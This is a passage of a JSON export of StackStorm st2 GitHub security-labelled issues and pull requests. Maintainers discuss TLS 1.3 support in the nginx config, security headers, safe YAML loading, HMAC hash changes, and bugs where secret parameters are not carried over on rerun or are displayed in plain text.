                        "body": "Yeah, I'm :+1: to add TLS 1.3 as and addition or default in `nginx.conf`. As I understand @Kami was +1 too.\r\n\r\nWe know that U16 doesn't work with nginx & TLS1.3, but we're removing Xenial in this release.\r\n\r\nI don't know if we want to add\r\n```diff\r\n- ssl_protocols TLSv1.2;\r\n+ ssl_protocols TLSv1.2 TLSv1.3;\r\n```\r\n\r\nor maybe\r\n\r\n```diff\r\n- ssl_protocols TLSv1.2;\r\n+ ssl_protocols TLSv1.3;\r\n```\r\nand how it'll work in practice on other platforms across the OS fleet we support? Probably something to research.\r\n\r\n@punkrokk @Kami what are your thoughts?\r\ncc @StackStorm/maintainers @StackStorm/contributors",
                        "user": "arm4b",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2021-06-01T19:22:31Z",
                        "url": "https://github.com/StackStorm/st2/issues/5216#issuecomment-852385462"
                    },
                    {
                        "body": "I thought @armab and I already discussed somewhere (can't find the PR atm) that sadly we can't do that yet since it's not just Xenial that doesn't support TLS v1.3 out of the box, but also Bionic and RHEL 7.\r\n\r\nI suggested only supporting TLS v1.3 on distros which support it (aka ship with OpenSSL 1.1.1), but that would increase the complexity and make troubleshooting harder.",
                        "user": "Kami",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2021-06-01T20:21:21Z",
                        "url": "https://github.com/StackStorm/st2/issues/5216#issuecomment-852420277"
                    },
                    {
                        "body": "I think we could have the install script sed the file based on the distro. Eh? Shouldn’t cause any issues. Eg only update it on newer distros. \n\nJP Bourget / @punkrokk\n\n> On Jun 1, 2021, at 4:21 PM, Tomaz Muraus ***@***.***> wrote:\n> \n> ﻿\n> I thought @armab and I already discussed somewhere (can't find the PR atm) that sadly we can't do that yet since it's not just Xenial that doesn't support TLS v1.3 out of the box, but also Bionic and RHEL 7.\n> \n> I suggested only supporting TLS v1.3 on distros which support it (aka ship with OpenSSL 1.1.1), but that would increase the complexity and make troubleshooting harder,\n> \n> —\n> You are receiving this because you were mentioned.\n> Reply to this email directly, view it on GitHub, or unsubscribe.\n",
                        "user": "punkrokk",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2021-06-01T20:40:52Z",
                        "url": "https://github.com/StackStorm/st2/issues/5216#issuecomment-852430969"
                    },
                    {
                        "body": "That's definitely possible, but it's a question of how we want to handle that. Installer script is just one of the \"consumers\" of that config file (other consumers include ansible playbook, chef, docker, etc.).\r\n\r\nI believe right now most of the installations methods just copy over that nginx.conf file without any modifications (IIRC, only outlier is docker stuff where we apply a patch which is already error prone and hard to maintainer).\r\n\r\nAnd even if we go with that route, the question is how to do it - default to TLS v1.2 and TLS v1.3 in the ngix.conf and then inside installer script remove TLS v1.3 if openssl 1.1.1 is not present or similar...",
                        "user": "Kami",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2021-06-01T21:16:48Z",
                        "url": "https://github.com/StackStorm/st2/issues/5216#issuecomment-852451577"
                    },
                    {
                        "body": "@armab What's your take on^?\r\n\r\nIIRC, you had the strongest opinion in the past about having multiple files / code paths in such scenarios (and IIRC, also @blag).",
                        "user": "Kami",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2021-06-02T09:39:07Z",
                        "url": "https://github.com/StackStorm/st2/issues/5216#issuecomment-852875423"
                    },
                    {
                        "body": "@Kami Thanks for more context! That's pretty critical information.\r\nI thought it just Ubuntu 16 in question. \r\nConsidering Ubuntu 18 and EL7 are also not TLS v1.3-compatible, I agree it doesn't worth the change.\r\n\r\nThe drift in the default installation environment would probably hit us back with different issues and community support. Something we tried to optimize before with an identical configuration across the OS fleet.\r\n\r\nSecurity-aware users can modify their configs, or service providers can recommend their clients to do the TLS 1.3 and more security hardening best practices that are not part of the default st2 config.\r\n\r\nIt might be even a good separation of the roles that comes naturally?\r\n",
                        "user": "arm4b",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2021-06-02T10:49:57Z",
                        "url": "https://github.com/StackStorm/st2/issues/5216#issuecomment-852925352"
                    },
                    {
                        "body": "Does enabling TLSv1.3 support cause problems on EL7 / Ubuntu 18? Or will nginix just ignore the protocol it can't support?\r\n\r\nhttps://github.com/StackStorm/st2/blob/6e9306c2324ccb374a60e99da3b5e00c6f3c11da/conf/nginx/st2.conf#L39\r\n\r\n```diff\r\n- ssl_protocols             TLSv1.2; \r\n+ ssl_protocols             TLSv1.2 TLSv1.3; \r\n```\r\n\r\nedit: context - I just added TLSv1.3 on our EL7 host, and I don't see any errors.",
                        "user": "cognifloyd",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2021-06-02T14:24:20Z",
                        "url": "https://github.com/StackStorm/st2/issues/5216#issuecomment-853072814"
                    },
                    {
                        "body": "Good point :+1: \r\n\r\nI think at this stage it would be nice to check all the OSes we support with a fresh install and if modified nginx config @cognifloyd mentioned works, any issues in the logs, what are the installed SSL versions in the system and how TLS version fall-back works in practice.\r\n",
                        "user": "arm4b",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2021-06-02T15:45:42Z",
                        "url": "https://github.com/StackStorm/st2/issues/5216#issuecomment-853138563"
                    },
                    {
                        "body": "on my EL7 host, I have:\r\n- `nginx-1.19.10-1.el7.ngx.x86_64` from the [nginx mainline repo](http://nginx.org/en/linux_packages.html#RHEL-CentOS) (1.21.0 is available - I haven't updated).\r\n- `openssl-1.0.2k-21.el7_9.x86_64` from CentOS Updates repo (nginx rpm declares a dependency on this one)\r\n- `openssl11-1.1.1g-3.el7.x86_64` from EPEL 7 repo\r\n\r\nNo issues in any of the logs or the journal. It is serving the site just fine. And chrome says I'm connecting with TLSv1.2, which makes sense given the lack of TLSv1.3 support on EL7:\r\n<img width=\"457\" alt=\"Screen Shot 2021-06-02 at 11 42 59\" src=\"https://user-images.githubusercontent.com/1558590/120519007-cd7e0c00-c397-11eb-9df5-5c1446d990c7.png\">\r\n",
                        "user": "cognifloyd",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2021-06-02T16:44:27Z",
                        "url": "https://github.com/StackStorm/st2/issues/5216#issuecomment-853189168"
                    },
                    {
                        "body": "That may work if we still want to support TLS v1.2 in addition to TLS v1.3, but need to double check since I thought it will error out if the openssl version against which nginx is linked doesn't support TLS v1.3 (but that may only be the case if we only specify TLS v1.3).\r\n\r\nAnother thing is cipher list - if we want to harden the deployment based on the available ciphers which depend on the OpenSSL version we will likely also need to have a special handling for that.\r\n\r\nWould also help if you can post the output against ``nginx -V``, in your case it maybe works because you installed openssl 1.1.1 from EPEL repo, but then again you said you are using nginx from the main line repo which likely isn't compiled against openssl 1.1.1.",
                        "user": "Kami",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2021-06-02T18:35:38Z",
                        "url": "https://github.com/StackStorm/st2/issues/5216#issuecomment-853288177"
                    },
                    {
                        "body": "It's using `openssl 1.0.2k-fips`\r\n\r\n```\r\n$ nginx -V\r\nnginx version: nginx/1.19.10\r\nbuilt by gcc 4.8.5 20150623 (Red Hat 4.8.5-44) (GCC) \r\nbuilt with OpenSSL 1.0.2k-fips  26 Jan 2017\r\nTLS SNI support enabled\r\nconfigure arguments: --prefix=/etc/nginx --sbin-path=/usr/sbin/nginx --modules-path=/usr/lib64/nginx/modules --conf-path=/etc/nginx/nginx.conf --error-log-path=/var/log/nginx/error.log --http-log-path=/var/log/nginx/access.log --pid-path=/var/run/nginx.pid --lock-path=/var/run/nginx.lock --http-client-body-temp-path=/var/cache/nginx/client_temp --http-proxy-temp-path=/var/cache/nginx/proxy_temp --http-fastcgi-temp-path=/var/cache/nginx/fastcgi_temp --http-uwsgi-temp-path=/var/cache/nginx/uwsgi_temp --http-scgi-temp-path=/var/cache/nginx/scgi_temp --user=nginx --group=nginx --with-compat --with-file-aio --with-threads --with-http_addition_module --with-http_auth_request_module --with-http_dav_module --with-http_flv_module --with-http_gunzip_module --with-http_gzip_static_module --with-http_mp4_module --with-http_random_index_module --with-http_realip_module --with-http_secure_link_module --with-http_slice_module --with-http_ssl_module --with-http_stub_status_module --with-http_sub_module --with-http_v2_module --with-mail --with-mail_ssl_module --with-stream --with-stream_realip_module --with-stream_ssl_module --with-stream_ssl_preread_module --with-cc-opt='-O2 -g -pipe -Wall -Wp,-D_FORTIFY_SOURCE=2 -fexceptions -fstack-protector-strong --param=ssp-buffer-size=4 -grecord-gcc-switches -m64 -mtune=generic -fPIC' --with-ld-opt='-Wl,-z,relro -Wl,-z,now -pie'\r\n```",
                        "user": "cognifloyd",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2021-06-02T19:25:48Z",
                        "url": "https://github.com/StackStorm/st2/issues/5216#issuecomment-853324494"
                    },
                    {
                        "body": "OK, I confirmed it indeed works and falls back to a supported version and doesn't error on startup in case multiple versions are specific and some / one of them is not supported by nginx.\r\n\r\nThat's a good news since we can indeed just do ``ssl_protocols             TLSv1.2 TLSv1.3``.",
                        "user": "Kami",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2021-06-02T21:08:06Z",
                        "url": "https://github.com/StackStorm/st2/issues/5216#issuecomment-853383594"
                    },
                    {
                        "body": "Meaning we can include that in v3.5.0.",
                        "user": "Kami",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2021-06-02T21:08:24Z",
                        "url": "https://github.com/StackStorm/st2/issues/5216#issuecomment-853383722"
                    }
                ],
                "pull_request": null
            },
            {
                "url": "https://github.com/StackStorm/st2/pull/5183",
                "title": "Added web security headers for nginx configuration",
                "labels": [
                    "enhancement",
                    "security",
                    "size/S"
                ],
                "user": "ashwini-orchestral",
                "issue_author_association": "CONTRIBUTOR",
                "number": 5183,
                "id": 824548205,
                "state": "closed",
                "project_created_at": "2021-03-08T13:16:42Z",
                "closed_at": "2021-03-12T10:50:33Z",
                "body": "Added a few web security headers in the Nginx configuration.\r\nFor example - X-Frame-Options Header, Cache-control.\r\nDisable server version information.\r\n",
                "comments": [
                    {
                        "body": "On a somewhat related note:\r\n\r\n>   ssl_protocols             TLSv1 TLSv1.1 TLSv1.2;\r\n\r\nTLS v1.0 and v1.1 are also both past it's prime time now so it would probably be a good idea to just support TLS v1.2 going forward.\r\n\r\nI don't think it should negatively affect any installations (most everything supports TLS v1.2 these days), but we can document it in ugprade notes and on how to add support for TLS v1.1 back, if needed.",
                        "user": "Kami",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2021-03-10T16:45:38Z",
                        "url": "https://github.com/StackStorm/st2/pull/5183#issuecomment-795717387"
                    },
                    {
                        "body": "@Kami Good point.\r\n@nmaludy raised this before in [Proposal: Tighten up SSL protocols and ciphers in nginx config #44](https://github.com/StackStorm/discussions/issues/44) and feels it's a good time to do it?",
                        "user": "arm4b",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2021-03-10T16:58:34Z",
                        "url": "https://github.com/StackStorm/st2/pull/5183#issuecomment-795737807"
                    },
                    {
                        "body": "@armab Yeah, I think now is the right time.\r\n\r\nI will also open docs and upgrade notes entry with that in case it affects someone, but I think that would be quite unlikely.",
                        "user": "Kami",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2021-03-10T17:22:26Z",
                        "url": "https://github.com/StackStorm/st2/pull/5183#issuecomment-795773135"
                    },
                    {
                        "body": "Added web header settings for possible security issues, X-Frame-Options, Strict-Transport-Security, X-XSS-Protection and server-tokens.\r\nThanks,\r\nshital-orchestral",
                        "user": "shital-orchestral",
                        "issue_author_association": "NONE",
                        "project_created_at": "2021-03-11T13:07:10Z",
                        "url": "https://github.com/StackStorm/st2/pull/5183#issuecomment-796722506"
                    },
                    {
                        "body": "@ashwini-orchestral Can you add an entry in the CHANGELOG?",
                        "user": "m4dcoder",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2021-03-11T18:30:15Z",
                        "url": "https://github.com/StackStorm/st2/pull/5183#issuecomment-796950204"
                    }
                ],
                "pull_request": {
                    "url": "https://api.github.com/repos/StackStorm/st2/pulls/5183",
                    "merged_at": "2021-03-12T10:50:32Z"
                }
            },
            {
                "url": "https://github.com/StackStorm/st2/pull/5162",
                "title": "Refactor spec_loader to use yaml.load with SafeLoader",
                "labels": [
                    "enhancement",
                    "security",
                    "size/S"
                ],
                "user": "ashwini-orchestral",
                "issue_author_association": "CONTRIBUTOR",
                "number": 5162,
                "id": 813442995,
                "state": "closed",
                "project_created_at": "2021-02-22T12:10:02Z",
                "closed_at": "2021-03-11T21:09:06Z",
                "body": "It is not safe to call yaml.load with any data received from an untrusted source. It allows instantiation of arbitrary objects. The function yaml.safe_load limits this ability to simple Python objects like integers or lists. For security reasons, yaml.safe_load is used.",
                "comments": [
                    {
                        "body": "@m4dcoder Can you please add a small test case for it? Here is quick example of similar test case I added recently - https://github.com/StackStorm/st2/pull/4846/files#diff-4d4c6f566c2d72910eff03ac16f442387a53beb0aa7e9b0ad5944ec5ce602ab2R101.\r\n\r\nBesides that, LGTM.",
                        "user": "Kami",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2021-03-04T18:43:12Z",
                        "url": "https://github.com/StackStorm/st2/pull/5162#issuecomment-790841679"
                    },
                    {
                        "body": "We just reformatted the code with black. (Hooray!) And this PR got caught in the cross fire too. (Arrgh!)\r\nLuckily, merging master into this PR should not have many conflicts. Cheers!\r\n\r\nAlso, we need to look at performance when we switch out `yaml.load` for `yaml.safe_load`. @m4dcoder just added CSafeLoader to orquesta, and ended up needing to pass CSafeLoader into yaml.load to get both the performance boost and the safety. See: https://github.com/StackStorm/orquesta/pull/230/files#diff-c2248ccb7408cc089d472f1dcb72a531c386cac3a9af7ad7de9bebc1d5910f3c (and the discussion on that PR as well).",
                        "user": "cognifloyd",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2021-03-07T07:17:35Z",
                        "url": "https://github.com/StackStorm/st2/pull/5162#issuecomment-792230825"
                    }
                ],
                "pull_request": {
                    "url": "https://api.github.com/repos/StackStorm/st2/pulls/5162",
                    "merged_at": "2021-03-11T21:09:06Z"
                }
            },
            {
                "url": "https://github.com/StackStorm/st2/pull/5161",
                "title": "Changes in the hash algorithm",
                "labels": [
                    "status:under discussion",
                    "security",
                    "database",
                    "size/L",
                    "migrations"
                ],
                "user": "ashwini-orchestral",
                "issue_author_association": "CONTRIBUTOR",
                "number": 5161,
                "id": 813434372,
                "state": "open",
                "project_created_at": "2021-02-22T11:57:45Z",
                "closed_at": null,
                "body": "For security purposes, the hash function for symmetric encryption is changed ie. from SHA1 to SHA256. Also, a migration script is added to update the database with new encrypted values.",
                "comments": [
                    {
                        "body": "SHA-1 is not used in encryption, it is used in HMAC, which is, to my knowledge, still currently considered secure.\n\nhttps://crypto.stackexchange.com/questions/26510/why-is-hmac-sha1-still-considered-secure/26518#26518\n\nWe should walk, but not necessarily run, away from SHA1 as HMAC.",
                        "user": "blag",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2021-02-22T18:32:38Z",
                        "url": "https://github.com/StackStorm/st2/pull/5161#issuecomment-783581257"
                    },
                    {
                        "body": "Thanks for the contribution.\r\n\r\nAs @blag pointed out, SHA1 is used for MAC and not for actual symmetric encryption.\r\n\r\nIn theory, I'm fine with changing it, but in case we do decide to change the MAC algorithm we should re-evaluate if the current implementation (both for the MAC and actual symmetric encryption) is indeed (still recommended) and a safe choice - and if there are more things we should change, we should change those as well (but of course since it's a security sensitive code, we need to be careful). And if we do it, maybe we should just use sha512 to be future proof - that code is not used in that many places so I don't think it should add tons of overhead.\r\n\r\nWe used to use keyczar which is not supported anymore so we migrated the same code and algorithms to ``cryptography``. It's likely that there are safer and more robust defaults available these days.\r\n\r\nAs far as implementation and roll out goes - StackStorm is a distributed system which means we should approach all such changes in a specific manner to ensure a consistent roll out without issues (it basically means that the code needs to support both versions for a while aka until changes are rolled out to all the services and migration script finishes).\r\n\r\nWe don't have database object versioning in place and we also can't rely on a migration script by itself - the code needs to support both implementations - basically on read we need to support sha1 and sha256, but when the value is updated, we should write it out in a new format. This way we also don't need to add another database field.\r\n\r\nAnd if we want to make sure all the values are indeed migrated in a reasonable time frame, we should instruct users to run a migration script or perhaps go with the read-repair approach (on the read, if it still uses a new format, re-write the object with a new format - probably the migration script is better and easier to do).",
                        "user": "Kami",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2021-02-22T20:13:06Z",
                        "url": "https://github.com/StackStorm/st2/pull/5161#issuecomment-783644217"
                    },
                    {
                        "body": "The comment about backward compatibility makes a lot of sense to me :+1: \r\nWe could also add a deprecation warning to logs in the case when an old key format is still used.",
                        "user": "arm4b",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2021-02-22T20:27:42Z",
                        "url": "https://github.com/StackStorm/st2/pull/5161#issuecomment-783653130"
                    },
                    {
                        "body": "I think the discussion should be focus on whether the sha1 function use for hmac poses security risk or tainted image of st2 on a vulnerability scan.\r\n\r\nOn the lesser issue on migration, I need some explanation why users cannot run a migration script during st2 upgrade. User just run the script to re-encrypt KVP in the datastore and move on. We've asked users to run migration script before in prior releases. Why is this an issue now?\r\n",
                        "user": "m4dcoder",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2021-02-23T07:45:40Z",
                        "url": "https://github.com/StackStorm/st2/pull/5161#issuecomment-783980685"
                    },
                    {
                        "body": "There's better understanding on the issue here after some discussion. The data is still encrypted with AES-256 per docs at https://docs.stackstorm.com/datastore.html?highlight=encryption_key_path#securing-secrets-admin-only. The sha1 hash is used to generate the hmac hash to verify the encrypted text. So technically, this is low risk. However, per feedback, there could be collisions and change is still recommended because of the collision weaknesses.",
                        "user": "m4dcoder",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2021-02-24T01:24:32Z",
                        "url": "https://github.com/StackStorm/st2/pull/5161#issuecomment-784663470"
                    },
                    {
                        "body": "We just reformatted the code with black. (Hooray!) And this PR got caught in the cross fire too. (Arrgh!)\r\nLuckily, merging master into this PR should not have many conflicts. Cheers!",
                        "user": "cognifloyd",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2021-03-07T07:12:49Z",
                        "url": "https://github.com/StackStorm/st2/pull/5161#issuecomment-792230388"
                    },
                    {
                        "body": "[![CLA assistant check](https://cla-assistant.io/pull/badge/signed)](https://cla-assistant.io/StackStorm/st2?pullRequest=5161) <br/>All committers have signed the CLA.",
                        "user": "CLAassistant",
                        "issue_author_association": "NONE",
                        "project_created_at": "2021-09-06T14:18:21Z",
                        "url": "https://github.com/StackStorm/st2/pull/5161#issuecomment-913685358"
                    },
                    {
                        "body": "@ashwini-orchestral Can you:\r\n- add a changelog entry\r\n- could you address my other comments:\r\n  - move `crypto_key = AESKey.generate()` somewhere else so it's not regenerated for every key, and save it. We don't want to regenerate the all the values with a new key only to discard the key (which would prevent decrypting the newly re-encrypted values).\r\n  - drop `new_encrypted_value` from the model or explain why its needed.",
                        "user": "cognifloyd",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2022-04-01T19:06:38Z",
                        "url": "https://github.com/StackStorm/st2/pull/5161#issuecomment-1086237063"
                    },
                    {
                        "body": "I'm marking this as a draft until it the implementation is complete.",
                        "user": "cognifloyd",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2022-04-01T19:09:02Z",
                        "url": "https://github.com/StackStorm/st2/pull/5161#issuecomment-1086238942"
                    }
                ],
                "pull_request": {
                    "url": "https://api.github.com/repos/StackStorm/st2/pulls/5161",
                    "merged_at": null
                }
            },
            {
                "url": "https://github.com/StackStorm/st2/pull/5151",
                "title": "Update cryptography to 3.3.2",
                "labels": [
                    "security",
                    "external dependency",
                    "size/S"
                ],
                "user": "blag",
                "issue_author_association": "CONTRIBUTOR",
                "number": 5151,
                "id": 807571273,
                "state": "closed",
                "project_created_at": "2021-02-12T21:54:23Z",
                "closed_at": "2021-02-13T01:59:27Z",
                "body": "This PR updates cryptography to 3.3.2.\r\n\r\nCloses #5147, #5148,  #5149",
                "comments": [],
                "pull_request": {
                    "url": "https://api.github.com/repos/StackStorm/st2/pulls/5151",
                    "merged_at": "2021-02-13T01:59:27Z"
                }
            },
            {
                "url": "https://github.com/StackStorm/st2/issues/5146",
                "title": "Workflow rerun doesn't inherit protected fields",
                "labels": [
                    "bug",
                    "security",
                    "component:st2web"
                ],
                "user": "minsis",
                "issue_author_association": "CONTRIBUTOR",
                "number": 5146,
                "id": 804984176,
                "state": "open",
                "project_created_at": "2021-02-09T22:36:49Z",
                "closed_at": null,
                "body": "I dont know if I should list this a feature request or bug.\r\n\r\nWhen clicking rerun in the history on the UI you have to reenter any passwords or protected fields as they do not carry over from the parent run. Since passwords and such are saved, a rerun of the workflow should be able to inherit the protected fields as it does with the others.\r\n\r\n",
                "comments": [
                    {
                        "body": "Please use our issue format, just like you did in #5145.\r\n\r\nWe need to know:\r\n\r\n* StackStorm version (Paste the output of `st2 --version`)\r\n* Exact steps to reproduce the problem (eg: what happens if you click rerun, and then don't change any of the parameter fields and just click run?)\r\n* Expected results\r\n* Actual results\r\n* Any other useful information, like screenshots or exact error messages",
                        "user": "blag",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2021-02-09T22:45:04Z",
                        "url": "https://github.com/StackStorm/st2/issues/5146#issuecomment-776294875"
                    },
                    {
                        "body": "## SUMMARY\r\n\r\nWhen clicking rerun in the history on the UI you have to reenter any passwords or protected fields as they do not carry over from the parent run. Since passwords and such are saved, a rerun of the workflow should be able to inherit the protected fields as it does with the others.\r\n\r\n### STACKSTORM VERSION\r\n\r\nst2 3.3.0, on Python 3.6.9\r\n\r\n##### OS, environment, install method\r\n\r\nOracle 7 using st2-docker\r\n\r\n## Steps to reproduce the problem\r\n\r\nHere I'm just using core.remote but it could be happening with others.\r\n\r\n- Configured a rule to run a remote command: ```ls -l /``` on a 10m Interval trigger. Execution is successful\r\n![image](https://user-images.githubusercontent.com/11248197/107440617-7eb31a80-6af9-11eb-81ca-2cbb20d79908.png)\r\n\r\n- In history click on rerun which brings up the config window. Simply just click on run with the supposedly same configured parameters. This run will fail\r\n![image](https://user-images.githubusercontent.com/11248197/107441938-c5097900-6afb-11eb-8b42-68069a9e26f8.png)\r\n\r\n- Click on rerun again and replace the obfuscated password with the correct password and click run. This will be successful\r\n- I looked to see if I could reproduce this on the CLI but I didn't see a way to do a rerun of the action. My assumption is the UI resubmits the previous parameters back to the API.\r\n\r\n## Expected Results\r\n\r\nWhen clicking rerun on a failed action it should inherit all the parameters including obfuscated ones\r\n\r\n## Actual Results\r\n\r\nThe 2nd rerun of the failed (or any action) failed to run due to an authentication issue because the UI didn't provide the previous run's password.\r\n",
                        "user": "minsis",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2021-02-09T23:31:05Z",
                        "url": "https://github.com/StackStorm/st2/issues/5146#issuecomment-776315818"
                    },
                    {
                        "body": "is there any update on this? I have a slightly different configuration but the outcome is still the same. Essentially we're storing AWS credentials encrypted in the KV store. These credentials are used for Terraform actions where we store the Terraform state in an S3 bucket:\r\n\r\n```\r\nparameters:\r\n  AWS_DEFAULT_REGION:\r\n    type: \"string\"\r\n    description: \"AWS region for Terraform S3 backend\"\r\n    required: true\r\n    default: \"{{ st2kv.system.tfbackend_AWS_DEFAULT_REGION | decrypt_kv }}\"\r\n    secret: true\r\n  AWS_ACCESS_KEY:\r\n    type: \"string\"\r\n    description: \"AWS Access Key for Terraform S3 backend\"\r\n    required: true\r\n    default: \"{{ st2kv.system.tfbackend_AWS_ACCESS_KEY | decrypt_kv }}\"\r\n    secret: true\r\n  AWS_SECRET_KEY:\r\n    type: \"string\"\r\n    description: \"AWS Secret Key for Terraform S3 backend\"\r\n    required: true\r\n    default: \"{{ st2kv.system.tfbackend_AWS_SECRET_KEY | decrypt_kv }}\"\r\n    secret: true\r\n  RABBITMQ_PASSWORD:\r\n    type: \"string\"\r\n    description: \"Password for RabbitMQ publishing\"\r\n    required: true\r\n    default: \"{{ st2kv.system.RABBITMQ_PASSWORD | decrypt_kv }}\"\r\n    secret: true\r\n  payload:\r\n    type: \"object\"\r\n    required: true\r\n```\r\n\r\nIf this workflow fails at any point, I'm unable to retry it in the Web UI without manually inputting the supposed default values. I've also tried completely clearing out the fields in hopes that the default values from the KV would be retrieved, but this doesn't work either.",
                        "user": "jensenja",
                        "issue_author_association": "NONE",
                        "project_created_at": "2022-04-21T21:12:05Z",
                        "url": "https://github.com/StackStorm/st2/issues/5146#issuecomment-1105764810"
                    },
                    {
                        "body": "@jensenja @minsis Are you seeing this issue only through Web UI? Does re-run work fine through CLI?",
                        "user": "khushboobhatia01",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2022-04-22T04:57:09Z",
                        "url": "https://github.com/StackStorm/st2/issues/5146#issuecomment-1106006565"
                    },
                    {
                        "body": "> @jensenja @minsis Are you seeing this issue only through Web UI? Does re-run work fine through CLI?\n\nI don't think the CLI has a rerun?",
                        "user": "minsis",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2022-04-25T05:05:45Z",
                        "url": "https://github.com/StackStorm/st2/issues/5146#issuecomment-1108082073"
                    },
                    {
                        "body": "There are re-run options via the CLI: https://docs.stackstorm.com/orquesta/operations.html\r\n\r\nI have not personally attempted it via CLI however.",
                        "user": "jensenja",
                        "issue_author_association": "NONE",
                        "project_created_at": "2022-04-25T14:18:33Z",
                        "url": "https://github.com/StackStorm/st2/issues/5146#issuecomment-1108638673"
                    },
                    {
                        "body": "@jensenja What version of StackStorm are you using?\r\n\r\nI've tested this again in 3.6.0 and it seems like everything is now working as expected.",
                        "user": "minsis",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2022-04-25T15:51:29Z",
                        "url": "https://github.com/StackStorm/st2/issues/5146#issuecomment-1108748819"
                    },
                    {
                        "body": "I'm running 3.6 via the one-liner install on an Ubuntu 20.04 VM:\r\n\r\n```\r\njjensen@destackstorm:~$ dpkg --list | grep st2\r\nii  st2                                   3.6.0-3                            amd64        StackStorm Event-driven automation\r\nii  st2chatops                            3.6.0-1                            amd64        St2Chatops - StackStorm ChatOps.\r\nii  st2web                                3.6.0-1                            amd64        St2Web - StackStorm Web UI.\r\n```",
                        "user": "jensenja",
                        "issue_author_association": "NONE",
                        "project_created_at": "2022-04-25T16:06:26Z",
                        "url": "https://github.com/StackStorm/st2/issues/5146#issuecomment-1108765071"
                    },
                    {
                        "body": "@jensenja When the workflow fails, are you trying rerun the entire workflow or just the specific task that failed?\r\n\r\nI'm my case I'm just testing a very simple `core.remote` execution. Also, as suggested have you tried to test the rerun on the CLI?",
                        "user": "minsis",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2022-04-25T16:18:32Z",
                        "url": "https://github.com/StackStorm/st2/issues/5146#issuecomment-1108779051"
                    },
                    {
                        "body": "Typically the entire workflow, especially if we need some Terraform actions to execute (ie they need to be retried). I've had mixed results on running the individual tasks via the Web UI - namely if the Terraform action task succeeds, the execution flow stops after that specific task completes; the CLI will likely be better for this route as it might appear that the user has more control over task execution via the CLI, just from skimming the docs.",
                        "user": "jensenja",
                        "issue_author_association": "NONE",
                        "project_created_at": "2022-04-25T16:22:45Z",
                        "url": "https://github.com/StackStorm/st2/issues/5146#issuecomment-1108783157"
                    }
                ],
                "pull_request": null
            },
            {
                "url": "https://github.com/StackStorm/st2/issues/5145",
                "title": "Passwords in UI and CLI displayed in plain text",
                "labels": [
                    "security"
                ],
                "user": "minsis",
                "issue_author_association": "CONTRIBUTOR",
                "number": 5145,
                "id": 804981858,
                "state": "closed",
                "project_created_at": "2021-02-09T22:32:42Z",
                "closed_at": "2021-06-15T17:32:40Z",
                "body": "## SUMMARY\r\n\r\nUI and CLI clients both show clear text passwords when viewing the config\r\n\r\n### STACKSTORM VERSION\r\n\r\nPaste the output of ``st2 --version``:\r\n\r\nst2 3.3.0, on Python 3.6.9\r\n\r\n##### OS, environment, install method\r\n\r\nOracle 7 using st2-docker\r\n\r\n## Steps to reproduce the problem\r\n\r\nHere I'm just using the core.remote action on an interval timer\r\n\r\n## Expected Results\r\n\r\nPassword shouldn't be displayed in clear text in the config. When going to edit or run the action the password is hidden.\r\n\r\n## Actual Results\r\n\r\nWhat happened? What output did you get?\r\n\r\nMaking sure to follow these steps will guarantee the quickest resolution possible.\r\n\r\nThanks!\r\n![image](https://user-images.githubusercontent.com/11248197/107436973-e8302a80-6af3-11eb-9276-133459063da7.png)\r\n\r\n![image](https://user-images.githubusercontent.com/11248197/107437237-4c52ee80-6af4-11eb-94f7-fd933c703365.png)\r\n\r\n\r\n\r\n",
                "comments": [
                    {
                        "body": "To be clear, the issue here is that, in the rule widget, action parameters and action runner parameters that are marked `secret: true` are not properly obfuscated by the server.\r\n\r\nThis probably also happens for the `passphrase`, `private_key`, and `sudo_password` parameters to the remote runner.",
                        "user": "blag",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2021-02-09T22:40:33Z",
                        "url": "https://github.com/StackStorm/st2/issues/5145#issuecomment-776292857"
                    },
                    {
                        "body": "Thanks for contributing to this issue. As it has been 90 days since the last activity, we are automatically marking is as stale. If this issue is not relevant or applicable anymore (problem has been fixed in a new version or similar), please close the issue or let us know so we can close it. On the contrary, if the issue is still relevant, there is nothing you need to do, but if you have any additional details or context which would help us when working on this issue, please include it as a comment to this issue.\n",
                        "user": "stale[bot]",
                        "issue_author_association": "NONE",
                        "project_created_at": "2021-06-02T17:59:12Z",
                        "url": "https://github.com/StackStorm/st2/issues/5145#issuecomment-853264172"
                    },
                    {
                        "body": "A better place to report this might be https://github.com/StackStorm/st2web.",
                        "user": "blag",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2021-06-02T20:02:00Z",
                        "url": "https://github.com/StackStorm/st2/issues/5145#issuecomment-853345527"
                    },
                    {
                        "body": "Moved to https://github.com/StackStorm/st2web/issues/896",
                        "user": "minsis",
